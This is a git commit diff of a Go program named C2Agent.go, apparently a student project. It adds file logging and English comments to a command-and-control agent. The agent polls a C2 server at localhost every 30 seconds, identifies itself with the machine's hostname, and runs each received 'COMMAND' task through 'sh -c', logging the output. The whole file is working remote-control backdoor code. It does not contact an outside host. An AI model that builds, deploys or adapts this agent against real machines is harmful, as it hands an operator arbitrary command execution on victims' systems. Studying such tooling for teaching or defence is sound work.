3d138685426dcacd3a1f6f9524ffda4538e0d7c9
evaristekunsuna_gwanulaga <evaristekunsuna.gwanulaga@ecole2600.com>
2023-02-20 02:10:05 +0100

    added log file and network checks between server and agent

--- C2Agent.go
+++ C2Agent.go
@@ -5,91 +5,100 @@ import (
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
+	"log"
 	"net/http"
 	"os"
-    "os/exec"
-    "time"
-	
+	"os/exec"
+	"time"
 )
+
 type Task struct {
-    Type        string `json:"Type"`
-    User        string `json:"User"`
-    Name        string `json:"Name"`
-    Description string `json:"Description"`
-    Data        string `json:"Data"`
-    Timestamp   string `json:"Timestamp"`
-    Id          string `json:"Id"`
-    After       string `json:"After"`
+	Type        string `json:"Type"`
+	User        string `json:"User"`
+	Name        string `json:"Name"`
+	Description string `json:"Description"`
+	Data        string `json:"Data"`
+	Timestamp   string `json:"Timestamp"`
+	Id          string `json:"Id"`
+	After       string `json:"After"`
 }
 
 type Request struct {
-    NextRequestTime string `json:"NextRequestTime"`
-    Tasks           []Task `json:"Tasks"`
+	NextRequestTime string `json:"NextRequestTime"`
+	Tasks           []Task `json:"Tasks"`
 }
 
 func main() {
-    hostname, _ := os.Hostname()
-    agentVersion := "1.0.0"
-    system := "Linux"
+	hostname, _ := os.Hostname()
+	agentVersion := "1.0.0"
+	system := "Linux"
 
-    for {
-        // Crée une requête pour récupérer des tâches auprès du serveur C2
-        request := Request{
-            NextRequestTime: time.Now().Format(time.RFC3339),
-            Tasks:           []Task{},
-        }
-        requestBody, err := json.Marshal(request)
-        if err != nil {
-            fmt.Println("Error marshalling request:", err)
-            continue
-        }
+	// Set up logging to a file
+	logFile, err := os.OpenFile("agent.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		log.Fatalf("Failed to open log file: %v", err)
+	}
+	defer logFile.Close()
+	logger := log.New(logFile, "", log.LstdFlags)
 
-        // Envoie la requête au serveur C2
-        client := &http.Client{}
-        req, err := http.NewRequest("POST", "http://127.0.0.1:8000/", bytes.NewBuffer(requestBody))
-        if err != nil {
-            fmt.Println("Error creating request:", err)
-            continue
-        }
-        req.Header.Add("User-Agent", fmt.Sprintf("Agent-C2-EX-MACHINA %s (%s) %s", agentVersion, system, hostname))
-        req.Header.Add("Content-Type", "application/json")
-        resp, err := client.Do(req)
-        if err != nil {
-            fmt.Println("Error sending request:", err)
-            continue
-        }
-        defer resp.Body.Close()
+	for {
+		// Create a request to retrieve tasks from the C2 server
+		request := Request{
+			NextRequestTime: time.Now().Format(time.RFC3339),
+			Tasks:           []Task{},
+		}
+		requestBody, err := json.Marshal(request)
+		if err != nil {
+			logger.Printf("Error marshalling request: %v\n", err)
+			continue
+		}
 
-        // Lit la réponse et exécute les tâches reçues
-        responseBody, err := ioutil.ReadAll(resp.Body)
-        if err != nil {
-            fmt.Println("Error reading response body:", err)
-            continue
-        }
+		// Send the request to the C2 server
+		client := &http.Client{}
+		req, err := http.NewRequest("POST", "http://127.0.0.1:8080/", bytes.NewBuffer(requestBody))
+		if err != nil {
+			logger.Printf("Error creating request: %v\n", err)
+			continue
+		}
+		req.Header.Add("User-Agent", fmt.Sprintf("Agent-C2-EX-MACHINA %s (%s) %s", agentVersion, system, hostname))
+		req.Header.Add("Content-Type", "application/json")
+		resp, err := client.Do(req)
+		if err != nil {
+			logger.Printf("Error sending request: %v\n", err)
+			continue
+		}
+		defer resp.Body.Close()
 
-        var response Request
-        err = json.Unmarshal(responseBody, &response)
-        if err != nil {
-            fmt.Println("Error unmarshalling response:", err)
-            continue
-        }
+		// Read the response and execute the received tasks
+		responseBody, err := ioutil.ReadAll(resp.Body)
+		if err != nil {
+			logger.Printf("Error reading response body: %v\n", err)
+			continue
+		}
 
-        for _, task := range response.Tasks {
-            switch task.Type {
-            case "COMMAND":
-                output, err := exec.Command("sh", "-c", task.Data).CombinedOutput()
-                if err != nil {
-                    fmt.Println("Error executing command:", err)
-                    continue
-                }
-                fmt.Println(string(output))
-            default:
-                fmt.Println("Unknown task type:", task.Type)
-                continue
-            }
-        }
+		var response Request
+		err = json.Unmarshal(responseBody, &response)
+		if err != nil {
+			logger.Printf("Error unmarshalling response: %v\n", err)
+			continue
+		}
 
-        // Attend 30 secondes avant de récupérer de nouvelles tâches
-        time.Sleep(30 * time.Second)
-    }
+		for _, task := range response.Tasks {
+			switch task.Type {
+			case "COMMAND":
+				output, err := exec.Command("sh", "-c", task.Data).CombinedOutput()
+				if err != nil {
+					logger.Printf("Error executing command: %v\n", err)
+					continue
+				}
+				logger.Printf("Command output: %s", output)
+			default:
+				logger.Printf("Unknown task type: %s\n", task.Type)
+				continue
+			}
+		}
+
+		// Wait 30 seconds before retrieving new tasks
+		time.Sleep(30 * time.Second)
+	}
 }
